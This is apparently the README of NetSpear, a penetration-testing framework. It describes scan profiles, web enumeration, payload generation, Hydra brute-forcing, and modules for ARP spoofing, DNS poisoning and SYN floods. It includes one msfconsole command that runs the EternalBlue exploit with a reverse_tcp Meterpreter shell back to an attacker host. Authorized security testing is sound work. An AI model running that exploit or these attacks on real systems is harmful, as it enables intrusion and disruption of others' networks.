# NetSpear

<img width="1280" height="320" alt="NetSpea1r Banner" src="https://github.com/user-attachments/assets/5de1b60a-f1c8-4172-9c65-408be55b5946" />

### Developed & Maintained by **OpenNET LLC**

NetSpear is an advanced modular cybersecurity assessment framework engineered for **authorized penetration testing**, **network reconnaissance**, and **controlled security research environments**.

Built by **OpenNET LLC**, NetSpear integrates automated reconnaissance, web-layer analysis, vulnerability detection, reporting, and controlled exploitation helpers into a single streamlined toolkit leveraging Nmap, Metasploit, Hydra, Scapy, and custom-developed modules.

> **LEGAL NOTICE**  
> NetSpear may ONLY be used on systems you own or have explicit written authorization to test.  
> Misuse may violate local and international law. The authors and OpenNET LLC accept no liability for unlawful use.

---

## Key Features

- Interactive, menu-driven **NetSpear Network Analyzer** CLI  
- Scan profiles: `quick`, `full`, `vuln`, `stealth`, `deep`  
- Scan modes: **SAFE**, **STEALTH**, **AGGRESSIVE**, **INSANE**, **KILLER**  
- **Multi-target threaded scans**  
- Optional **rustscan/masscan prescan** for high-speed discovery  
- Automatic **Nmap service detection**  
- **CVE extraction + vulnerability mapping**  
- **Metasploit exploit helper** (module suggestions + payload hints)  
- **Payload generator** (Windows, Linux, macOS, Android, raw shellcode)  
- **Web enumeration pipeline**: WhatWeb, Wappalyzer, WAFW00F, ffuf/gobuster/feroxbuster, nuclei  
- **OSINT mode** with GeoIP + HTTP fingerprinting (+ optional SpiderFoot)  
- **Hydra brute-force helpers** (SSH, FTP)  
- **Offensive modules** (lab use only): ARP spoofing, DNS poisoning, SYN flood  
- **HTML + JSON reporting** with exposure score, anomaly detection, tech highlights  
- Environment-variable configuration (override tool paths, presets)  
- Privilege checks, safety prompts, and clean logging

```text

## Project Structure

NetSpear/
├── main.py               # CLI + scan controller
├── network_scanning.py   # Nmap engine + prescan logic
├── payloads.py           # msfvenom payload generator
├── attacks.py            # Offensive modules
├── exploits.py           # Exploit mapper + MSF integration
├── reporting.py          # HTML/JSON report builder
├── utils.py              # Helpers (IP validation, logging, etc)
├── config.py             # Tool paths, defaults, report paths
├── requirements.txt
└── Reports/              # Auto-generated reports

```

## Installation

1. Clone the Repository

git clone https://github.com/<your-user>/NetSpear.git  
cd NetSpear

2. (Optional) Create a Virtual Environment

python3 -m venv .venv  
source .venv/bin/activate

3. Install Python Dependencies

pip install -r requirements.txt

4. Install External Tools

NetSpear depends on several offensive security tools. Some are required, others optional but highly recommended.

Required:  
- nmap

Recommended:  
- msfvenom, msfconsole  
- hydra  
- whatweb  
- wappalyzer CLI  
- wafw00f  
- nuclei  
- ffuf / gobuster / feroxbuster  
- sqlmap  
- rustscan or masscan  
- sfcli (SpiderFoot CLI)

Environment variable overrides:

NMAP_PATH, MSFCONSOLE_PATH, MSFVENOM_PATH, HYDRA_PATH, GOBUSTER_PATH,  
FFUF_PATH, MASSCAN_PATH, RUSTSCAN_PATH, NUCLEI_PATH, WHATWEB_PATH,  
WAPPALYZER_PATH, FEROXBUSTER_PATH, WAFW00F_PATH, SQLMAP_PATH, SPIDERFOOT_PATH

---

## Usage

Interactive Mode (Recommended)

python3 main.py

Direct Scan Example

python3 main.py --target 192.168.1.10 --scan-type vuln --stealth

Full Flag List  
- --target <IP>  
- --scan-type (quick, full, vuln, stealth, deep)  
- --stealth  
- --proxy <proxy-url>  
- --unsafe  

Help:

python3 main.py -h

---

## Scan Profiles (Internal Nmap Mappings)

Quick Scan:  
-F -T5 --max-rtt-timeout 50ms

Full Scan:  
-p- -A -T5 --osscan-guess

Vulnerability Scan:  
--script=vuln -T5 --min-rate 3000

Stealth Scan:  
-sS -T2 --max-retries 1 -Pn

Deep Scan:  
-sV -sC -O -T5 --min-rate 2000

Modes like **AGGRESSIVE**, **INSANE**, and **KILLER** further tune timing and prescan behavior.

---

## Recon & Web Enumeration

NetSpear performs:  
- Tech fingerprinting (WhatWeb, Wappalyzer)  
- Directory enumeration (ffuf, gobuster, feroxbuster)  
- WAF detection  
- Nuclei tests  
- TLS inspection  
- Admin endpoint detection  
- GeoIP + header fingerprinting  
- Optional SpiderFoot OSINT sweep  

---

## Payload Generation

Supports:  
- Windows (.exe)  
- Linux (ELF)  
- macOS (Mach-O)  
- Android (.apk)  
- Raw shellcode  

---

## Hydra Brute-Force Modules

Supports:  
- SSH  
- FTP  

---

## Offensive Modules (Root Required)

- ARP Spoofing  
- DNS Poisoning  
- SYN Flood  
- Brute-force Overdrive  

---

## Exploit Helper (Metasploit Integration)

Example:

msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue;  
set RHOST <ip>; set PAYLOAD windows/meterpreter/reverse_tcp;  
set LHOST <attacker>; exploit"

---

## Reporting Engine

Outputs:
- HTML (dark mode)  
- JSON  

Includes:
- Exposure score  
- Open ports  
- Services  
- CVEs  
- Web anomalies  
- Recommendations  
- Recon profiles  
- Raw Nmap output  

---

## Maintainer

**© OpenNET LLC — Cybersecurity Division**  
Advanced tools for secure networks, enterprise defense, and professional penetration testing.

If you use NetSpear in research or assessments, please attribute:  
“NetSpear Network Analyzer — OpenNET LLC”
